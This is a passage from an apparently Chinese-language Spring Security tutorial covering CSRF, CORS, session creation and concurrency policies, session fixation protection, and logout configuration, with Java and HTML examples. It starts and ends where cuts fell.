<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        .csrf(csrf -&gt; csrf.disable()); <span class="comment">// 禁用 CSRF 防护</span></span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>警告</strong>: 除非你完全确定你的认证机制（如 JWT in Header）不受 CSRF 攻击影响，否则不要轻易禁用它。如果你的应用同时支持 Cookie 认证和 API Token 认证，你需要更精细的配置来只对 API 部分禁用 CSRF。</p>
<hr>
<h3 id="4-2-CORS-跨域资源共享-配置"><a href="#4-2-CORS-跨域资源共享-配置" class="headerlink" title="4.2 CORS (跨域资源共享) 配置"></a>4.2 CORS (跨域资源共享) 配置</h3><p>在<code>Spring全家桶-SpringWeb</code>中的1.5.4节介绍过了跨域问题，那么SpringSecurity是如何解决的呢。</p>
<h4 id="4-2-1-启用-CORS-支持-cors"><a href="#4-2-1-启用-CORS-支持-cors" class="headerlink" title="4.2.1 启用 CORS 支持: .cors()"></a>4.2.1 启用 CORS 支持: <code>.cors()</code></h4><p>首先，你需要在你的 <code>SecurityFilterChain</code> 配置中调用 <code>.cors()</code> 方法来启用 CORS 支持。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        .cors(Customizer.withDefaults()) <span class="comment">// 启用 CORS，并使用默认配置</span></span><br><span class="line">        <span class="comment">// ... 其他配置</span></span><br><span class="line">    ;</span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>.cors()</code> 的作用是在 Spring Security 的过滤器链中添加一个 <code>CorsFilter</code>。这个过滤器会尝试从 Spring 的应用上下文中查找一个名为 <code>corsConfigurationSource</code> 的 Bean。如果找到了，它就会使用这个 Bean 提供的配置来处理 CORS 请求。</p>
<h4 id="4-2-2-提供-CORS-配置-CorsConfigurationSource-Bean"><a href="#4-2-2-提供-CORS-配置-CorsConfigurationSource-Bean" class="headerlink" title="4.2.2 提供 CORS 配置: CorsConfigurationSource Bean"></a>4.2.2 提供 CORS 配置: <code>CorsConfigurationSource</code> Bean</h4><p>所以，下一步就是定义这个 <code>corsConfigurationSource</code> Bean。这是配置 CORS 规则的核心。</p>
<p><strong>推荐方式：创建一个 <code>CorsConfigurationSource</code> Bean</strong></p>
<p>这种方式最灵活，允许你根据不同的请求路径应用不同的 CORS 策略。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.cors.CorsConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.cors.CorsConfigurationSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.cors.UrlBasedCorsConfigurationSource;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CorsConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> CorsConfigurationSource <span class="title function_">corsConfigurationSource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 创建 CorsConfiguration 对象</span></span><br><span class="line">        <span class="type">CorsConfiguration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CorsConfiguration</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 设置允许的源</span></span><br><span class="line">        <span class="comment">// configuration.setAllowedOrigins(Arrays.asList(&quot;http://localhost:3000&quot;, &quot;https://app.my-domain.com&quot;));</span></span><br><span class="line">        <span class="comment">// 对于需要携带凭证（如Cookie）的请求，不能使用 &quot;*&quot;，必须指定具体的源</span></span><br><span class="line">        configuration.setAllowedOrigins(List.of(<span class="string">&quot;http://localhost:3000&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. 设置允许的 HTTP 方法</span></span><br><span class="line">        configuration.setAllowedMethods(Arrays.asList(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>, <span class="string">&quot;OPTIONS&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. 设置允许的请求头</span></span><br><span class="line">        <span class="comment">// &quot;*&quot; 表示允许所有头，但在生产环境中建议明确指定</span></span><br><span class="line">        configuration.setAllowedHeaders(Arrays.asList(<span class="string">&quot;Authorization&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 5. 设置是否允许发送 Cookie 等凭证</span></span><br><span class="line">        <span class="comment">// 当设置为 true 时，allowedOrigins 不能为 &quot;*&quot;</span></span><br><span class="line">        configuration.setAllowCredentials(<span class="literal">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 6. 暴露哪些响应头给前端JS，让其可以访问</span></span><br><span class="line">        <span class="comment">// configuration.setExposedHeaders(Arrays.asList(&quot;header1&quot;, &quot;header2&quot;));</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 7. 设置预检请求的有效期，单位为秒。在此期间，浏览器无需为相同的跨域请求再次发送预检请求</span></span><br><span class="line">        configuration.setMaxAge(<span class="number">3600L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 8. 创建 UrlBasedCorsConfigurationSource 对象，注册 CORS 配置</span></span><br><span class="line">        <span class="type">UrlBasedCorsConfigurationSource</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlBasedCorsConfigurationSource</span>();</span><br><span class="line">        <span class="comment">// 对所有 URL 路径应用上述配置</span></span><br><span class="line">        source.registerCorsConfiguration(<span class="string">&quot;/**&quot;</span>, configuration);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码解读</strong>:</p>
<ul>
<li><code>setAllowedOrigins()</code>: 设置允许跨域请求的来源。在开发环境中，这通常是你的前端开发服务器地址（如 <code>http://localhost:3000</code>）。</li>
<li><code>setAllowedMethods()</code>: 设置允许的 HTTP 方法。</li>
<li><code>setAllowedHeaders()</code>: 设置允许的请求头。如果你的前端需要发送自定义头（如 <code>Authorization</code> for JWT），必须在这里声明。</li>
<li><code>setAllowCredentials(true)</code>: <strong>非常重要</strong>。如果你的前后端交互需要使用 Cookie 或 <code>Authorization</code> 头来进行会话管理和认证，必须将此项设为 <code>true</code>。同时，前端的 <code>axios</code> 或 <code>fetch</code> 请求也需要设置 <code>withCredentials: true</code>。</li>
<li><code>registerCorsConfiguration(&quot;/**&quot;, configuration)</code>: 将我们创建的 <code>CorsConfiguration</code> 应用到所有的 URL 路径 (<code>/**</code>) 上。你也可以为不同的路径（如 <code>/api/**</code> 和 <code>/public/**</code>）注册不同的 CORS 配置。</li>
</ul>
<p><strong>另一种配置方式：<code>WebMvcConfigurer</code></strong></p>
<p>在SpringWeb中介绍了此方法，当同时存在 <code>WebMvcConfigurer</code> 的 CORS 配置和 Spring Security 的 CORS 配置时，<strong>Spring Security 的配置会优先生效</strong>，因为它通过 <code>CorsFilter</code> 在过滤器链的更早阶段处理了请求。因此，<strong>推荐使用 <code>CorsConfigurationSource</code> Bean 的方式，将所有安全相关的配置集中在 Spring Security 中</strong>。</p>
<hr>
<h3 id="4-3-Session-管理"><a href="#4-3-Session-管理" class="headerlink" title="4.3 Session 管理"></a>4.3 Session 管理</h3><p>在传统的有状态（Stateful）Web 应用中，Session 是服务器用来跟踪和维持单个用户会话状态的核心机制。当用户首次登录成功后，服务器会创建一个 Session 对象，并生成一个唯一的 Session ID。这个 Session ID 通常通过 Cookie（名为 <code>JSESSIONID</code>）发送给浏览器。在后续的请求中，浏览器会自动携带这个 Cookie，服务器通过 Session ID 就能找到对应的 Session 对象，从而识别用户身份。</p>
<p>Spring Security 对 Session 的创建、使用和销毁提供了全面的控制和保护。</p>
<h4 id="4-3-1-Session-创建策略-SessionCreationPolicy"><a href="#4-3-1-Session-创建策略-SessionCreationPolicy" class="headerlink" title="4.3.1 Session 创建策略 (SessionCreationPolicy)"></a>4.3.1 Session 创建策略 (SessionCreationPolicy)</h4><p>Spring Security 允许我们精细地控制何时创建 <code>HttpSession</code>。这对于构建不同类型的应用（如有状态 Web 应用和无状态 REST API）至关重要。</p>
<p>通过 <code>.sessionManagement().sessionCreationPolicy()</code> 进行配置：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        .sessionManagement(session -&gt; session</span><br><span class="line">            .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED) <span class="comment">// 设置策略</span></span><br><span class="line">        );</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>四种策略</strong>:</p>
<ol>
<li><strong><code>SessionCreationPolicy.IF_REQUIRED</code> (默认值)</strong><ul>
<li><strong>含义</strong>: 只有在需要时，Spring Security 才会创建 <code>HttpSession</code>。</li>
<li><strong>“需要时”</strong> 指的是：当需要存储与认证相关的信息时，比如 <code>SecurityContext</code>。典型的场景是用户通过表单登录成功后，需要将 <code>Authentication</code> 对象保存起来以维持登录状态。</li>
<li><strong>适用场景</strong>: 绝大多数传统的、有状态的 Web 应用。</li>
</ul>
</li>
<li><strong><code>SessionCreationPolicy.STATELESS</code></strong><ul>
<li><strong>含义</strong>: Spring Security <strong>永远不会</strong>创建 <code>HttpSession</code>，也<strong>不会</strong>使用它来获取 <code>SecurityContext</code>。</li>
<li><strong>适用场景</strong>: <strong>无状态的 REST API</strong>。这类 API 的每次请求都应该是自包含的，认证信息通常通过其他方式携带，比如放在 <code>Authorization</code> Header 中的 JWT (JSON Web Token)。这使得 API 服务可以轻松地水平扩展，因为服务器不需要在内存中维护任何用户的 Session 信息。</li>
</ul>
</li>
<li><strong><code>SessionCreationPolicy.NEVER</code></strong><ul>
<li><strong>含义</strong>: Spring Security <strong>永远不会</strong>自己创建 <code>HttpSession</code>，但是如果应用的其他部分（例如，非安全相关的代码）已经创建了一个 Session，Spring Security <strong>会使用它</strong>。</li>
<li><strong>适用场景</strong>: 当你确定应用本身需要 Session，但希望 Spring Security 自身不主动触发 Session 创建时使用。比较少见。</li>
</ul>
</li>
<li><strong><code>SessionCreationPolicy.ALWAYS</code></strong><ul>
<li><strong>含义</strong>: Spring Security <strong>总是</strong>会创建一个 <code>HttpSession</code>，即使用是匿名用户。</li>
<li><strong>适用场景</strong>: 极少使用。可能用于需要为匿名用户也跟踪某些会话状态的特殊场景。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="4-3-2-Session-并发控制-Concurrent-Session-Control"><a href="#4-3-2-Session-并发控制-Concurrent-Session-Control" class="headerlink" title="4.3.2 Session 并发控制 (Concurrent Session Control)"></a>4.3.2 Session 并发控制 (Concurrent Session Control)</h4><p>这是一个常见的业务需求：<strong>限制同一个用户账户在同一时间只能在一个地方（或指定数量的地方）登录</strong>。例如，防止账户共享，或者在用户登录新设备时自动踢掉旧设备的登录。</p>
<p><strong>配置步骤</strong>:</p>
<h5 id="1-添加-Listener"><a href="#1-添加-Listener" class="headerlink" title="1. 添加 Listener"></a>1. 添加 Listener</h5><p>Spring Security 需要监听 Session 的销毁事件，以便在 Session 过期或被无效化时，能够清理其在并发控制注册表中的记录。为此，需要在主应用类或配置类中注册一个 <code>HttpSessionEventPublisher</code> 的 Bean。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.session.HttpSessionEventPublisher;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在你的 @Configuration 类中</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> HttpSessionEventPublisher <span class="title function_">httpSessionEventPublisher</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HttpSessionEventPublisher</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>在 Spring Boot 2.x 中，这个 Bean 似乎是自动配置的，但在 Spring Boot 3.x 及 Spring Framework 6.x 中，官方文档建议显式声明它以确保功能正常。</em></p>
<hr>
<h5 id="2-配置并发控制"><a href="#2-配置并发控制" class="headerlink" title="2. 配置并发控制"></a>2. 配置并发控制</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        .sessionManagement(session -&gt; session</span><br><span class="line">            .maximumSessions(<span class="number">1</span>) <span class="comment">// 1. 设置最大并发会话数量为 1</span></span><br><span class="line">            .maxSessionsPreventsLogin(<span class="literal">true</span>) <span class="comment">// 2. (策略二选一) 当达到最大会话数时，阻止新登录</span></span><br><span class="line">            <span class="comment">// .expiredUrl(&quot;/login?expired&quot;) // (可选) 当会话因并发登录被踢掉时重定向的 URL</span></span><br><span class="line">        );</span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>.maximumSessions(int maxSessions)</code>: 设置允许的并发会话最大数量。设置为 <code>1</code> 表示只允许单点登录。</li>
<li>之后，你需要选择一个<strong>并发处理策略</strong>（二选一）：<ul>
<li><strong><code>.maxSessionsPreventsLogin(true)</code></strong>: <strong>阻止新登录</strong>。如果用户 “user” 已经在一个地方登录，当他尝试在另一个地方用相同的账户登录时，新的登录请求将被拒绝。旧的登录会话保持有效。</li>
<li><strong><code>.maxSessionsPreventsLogin(false)</code> (默认行为)</strong>: <strong>踢掉旧登录</strong>。如果用户 “user” 已经登录，当他从新设备登录时，新登录会成功，而<strong>旧的登录会话将被标记为无效</strong>。当旧设备上的用户下次发起请求时，他会被强制下线，并可以被重定向到 <code>.expiredUrl()</code> 指定的页面。这是更常见的“互踢”策略。</li>
</ul>
</li>
</ul>
<p><strong>注意</strong>: 要使并发控制生效，<code>UserDetails</code> 的 <code>equals()</code> 和 <code>hashCode()</code> 方法必须被正确实现（通常基于 <code>username</code>），以确保 Spring Security 能够正确识别是“同一个用户”。</p>
<hr>
<h4 id="4-3-3-Session-Fixation-会话固定-攻击防护"><a href="#4-3-3-Session-Fixation-会话固定-攻击防护" class="headerlink" title="4.3.3 Session Fixation (会话固定) 攻击防护"></a>4.3.3 Session Fixation (会话固定) 攻击防护</h4><h5 id="1-什么是会话固定攻击？"><a href="#1-什么是会话固定攻击？" class="headerlink" title="1. 什么是会话固定攻击？"></a>1. 什么是会话固定攻击？</h5><p>这是一种攻击者试图将自己的 Session ID 强加给受害者的攻击方式。</p>
<ul>
<li><strong>攻击流程</strong>:<ol>
<li>攻击者 Mallory 访问了目标网站 <code>example.com</code>，服务器为她创建了一个 Session 并返回了 Session ID (例如，<code>JSESSIONID=111</code>)。</li>
<li>Mallory 通过某种方式（如钓鱼链接、网络劫持）诱导受害者 Bob 使用这个 Session ID (<code>111</code>) 去访问 <code>example.com</code>。例如，<code>http://example.com?JSESSIONID=111</code>。</li>
<li>Bob 没有察觉，点击链接后，输入了自己的用户名和密码成功登录。</li>
<li><strong>问题来了</strong>：服务器在 Bob 登录后，<strong>没有改变 Session ID</strong>，而是直接将 Bob 的认证信息关联到了这个已知的 Session ID (<code>111</code>) 上。</li>
<li>现在，攻击者 Mallory 就可以使用她预先知道的 Session ID (<code>111</code>) 来访问网站，服务器会认为她就是已经登录的 Bob，从而劫持了 Bob 的会话。</li>
</ol>
</li>
</ul>
<hr>
<h5 id="2-Spring-Security-的防护机制"><a href="#2-Spring-Security-的防护机制" class="headerlink" title="2. Spring Security 的防护机制"></a>2. Spring Security 的防护机制</h5><p>Spring Security <strong>默认开启了强大的会话固定攻击防护</strong>，你几乎不需要做任何额外配置。</p>
<ul>
<li><strong>核心策略</strong>: <strong>在用户认证成功后，迁移 Session</strong>。<ul>
<li>当用户成功登录时，Spring Security 会使当前的（可能是攻击者注入的）Session 无效化。</li>
<li>然后，它会创建一个<strong>全新的 Session</strong>，并生成一个<strong>全新的、不可预测的 Session ID</strong>。</li>
<li>最后，它会将旧 Session 中的所有属性复制到新 Session 中，并将新的 Session ID 返回给用户的浏览器。</li>
</ul>
</li>
</ul>
<p>这样一来，即使攻击者成功地将自己的 Session ID 固定给了受害者，一旦受害者登录，这个旧的 Session ID 就会失效，攻击者无法再利用它来劫持会话。</p>
<p><strong>配置</strong>:</p>
<p>这个行为由 <code>.sessionManagement().sessionFixation()</code> 控制。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.sessionManagement(session -&gt; session</span><br><span class="line">    .sessionFixation(fixation -&gt; fixation</span><br><span class="line">        .migrateSession() <span class="comment">// 默认策略，最推荐</span></span><br><span class="line">        <span class="comment">// .newSession()      // 创建新 Session，但不复制属性</span></span><br><span class="line">        <span class="comment">// .none()           // 关闭防护 (极不推荐!)</span></span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>migrateSession()</code>: <strong>默认值，也是最安全的选项</strong>。使旧 Session 失效，创建新 Session，并复制旧 Session 的属性。</li>
<li><code>newSession()</code>: 使旧 Session 失效，创建新 Session，但<strong>不复制</strong>属性。</li>
<li><code>none()</code>: <strong>禁用</strong>会话固定攻击防护。<strong>除非你有非常特殊且明确的理由，否则永远不要使用这个选项。</strong></li>
</ul>
<hr>
<h3 id="4-4-注销-Logout-功能"><a href="#4-4-注销-Logout-功能" class="headerlink" title="4.4 注销 (Logout) 功能"></a>4.4 注销 (Logout) 功能</h3><p>注销 (Logout) 是一个允许用户主动终止其认证会话的过程。一个设计良好的注销功能不仅能提升用户体验，更是保障账户安全的关键步骤。Spring Security 提供了非常灵活且强大的注Gitg能来配置和自定义注销行为。</p>
<h4 id="4-4-1-默认的注销功能"><a href="#4-4-1-默认的注销功能" class="headerlink" title="4.4.1 默认的注销功能"></a>4.4.1 默认的注销功能</h4><p>只需在 <code>SecurityFilterChain</code> 配置中加入 <code>.logout()</code>，即可启用一套功能完备的默认注销机制。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        <span class="comment">// ... 其他配置</span></span><br><span class="line">        .logout(Customizer.withDefaults()); <span class="comment">// 使用默认配置启用注销功能</span></span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>默认情况下，这会提供以下功能：</p>
<ol>
<li><strong>监听注销 URL</strong>: 默认会拦截对 <code>/logout</code> 的 <strong>GET 请求</strong>。当用户访问这个 URL 时，注销流程就会被触发。（注意：出于安全考虑，推荐使用 POST 请求进行注销，下面会讲如何配置）。</li>
<li><strong>执行注销操作</strong>: 当注销流程被触发时，<code>LogoutFilter</code> 会执行一系列清理操作：<ul>
<li><strong>使 <code>HttpSession</code> 无效化 (Invalidate)</strong>：这是最关键的一步，清除了服务器端的所有会-话信息。</li>
<li><strong>清空 <code>SecurityContextHolder</code></strong>: 清除当前线程的安全上下文。</li>
<li><strong>清除 “记住我” (Remember-Me) Cookie</strong>: 如果用户之前使用了 “记住我” 功能，相关的持久化认证信息也会被删除。</li>
</ul>
</li>
<li><strong>重定向</strong>: 注销成功后，默认会将用户重定向到 <code>/login?logout</code> 页面。</li>
</ol>
<p><strong>前端实现</strong>:</p>
<p>你只需要在页面上提供一个指向 <code>/logout</code> 的链接或按钮即可。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 如果使用 GET (不推荐，但默认支持) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/logout&#125;&quot;</span>&gt;</span>Logout<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 如果使用 POST (推荐) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">&quot;@&#123;/logout&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Logout<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>为什么推荐使用 POST？</strong></p>
<p>使用 GET 请求进行注销存在 CSRF 风险。攻击者可以在恶意网站上放置一个 <code>&lt;img src=&quot;http://your-site.com/logout&quot;&gt;</code>，诱导已登录的用户访问，从而在用户不知情的情况下将其注销。虽然注销操作的危害性通常小于转账等操作，但这仍是一种不良实践。要求使用 POST 并配合 CSRF Token 可以完全杜绝这种风险。</p>
<hr>
<h4 id="4-4-2-自定义注销配置"><a href="#4-4-2-自定义注销配置" class="headerlink" title="4.4.2 自定义注销配置"></a>4.4.2 自定义注销配置</h4><p>Spring Security 允许我们通过 Lambda 表达式对注销的各个方面进行详细配置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        .logout(logout -&gt; logout</span><br><span class="line">            <span class="comment">// 1. 配置触发注销的 URL</span></span><br><span class="line">            .logoutUrl(<span class="string">&quot;/perform_logout&quot;</span>) <span class="comment">// 默认为 /logout</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 2. 指定注销请求必须是 POST (推荐)</span></span><br><span class="line">            .logoutRequestMatcher(<span class="keyword">new</span> <span class="title class_">AntPathRequestMatcher</span>(<span class="string">&quot;/perform_logout&quot;</span>, <span class="string">&quot;POST&quot;</span>))</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 3. 注销成功后的重定向地址</span></span><br><span class="line">            .logoutSuccessUrl(<span class="string">&quot;/login?logout_success&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 4. 注销时清除的 Cookie</span></span><br><span class="line">            .deleteCookies(<span class="string">&quot;JSESSIONID&quot;</span>, <span class="string">&quot;remember-me&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 5. 是否在注销时使 HttpSession 无效</span></span><br><span class="line">            .invalidateHttpSession(<span class="literal">true</span>) <span class="comment">// 默认为 true</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 6. 是否在注销时清除 SecurityContextHolder</span></span><br><span class="line">            .clearAuthentication(<span class="literal">true</span>) <span class="comment">// 默认为 true</span></span><br><span class="line">        );</span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>配置项详解</strong>:</p>
<ul>
<li><code>.logoutUrl(&quot;/perform_logout&quot;)</code>: 更改 <code>LogoutFilter</code> 监听的 URL。</li>
<li><code>.logoutRequestMatcher(...)</code>: 提供一个 <code>RequestMatcher</code> 来更精细地定义触发注销的请求。这里我们明确要求必须是 <code>POST</code> 方法访问 <code>/perform_logout</code>。这是替代 <code>.logoutUrl()</code> 的更现代、更灵活的方式。</li>
<li><code>.logoutSuccessUrl(&quot;/login?logout_success&quot;)</code>: 指定注销成功后重定向到哪个页面。</li>
<li><code>.deleteCookies(&quot;cookie1&quot;, &quot;cookie2&quot;, ...)</code>: 告诉 Spring Security 在注销时除了默认的 “记住我” Cookie 外，还应清除哪些指定的 Cookie。这对于清理应用自定义的 Cookie 非常有用。</li>
<li><code>.invalidateHttpSession(true)</code>: 确保 <code>HttpSession</code> 被销毁。通常应保持为 <code>true</code>。</li>
<li><code>.clearAuthentication(true)</code>: 确保 <code>SecurityContextHolder</code> 被清空。通常也应保持为 <code>true</code>。</li>
</ul>
<h4 id="4-4-3-自定义注销成功后的处理器"><a href="#4-4-3-自定义注销成功后的处理器" class="headerlink" title="4.4.3 自定义注销成功后的处理器"></a>4.4.3 自定义注销成功后的处理器</h4><p><code>.logoutSuccessUrl()</code> 只能实现简单的重定向。对于更复杂的场景，例如在前后端分离的应用中，注销后需要返回一段 JSON 数据，而不是重定向页面，这时我们就需要自定义 <code>LogoutSuccessHandler</code>。</p>
<p><strong>步骤 1: 创建 <code>LogoutSuccessHandler</code> 的实现类</strong></p>
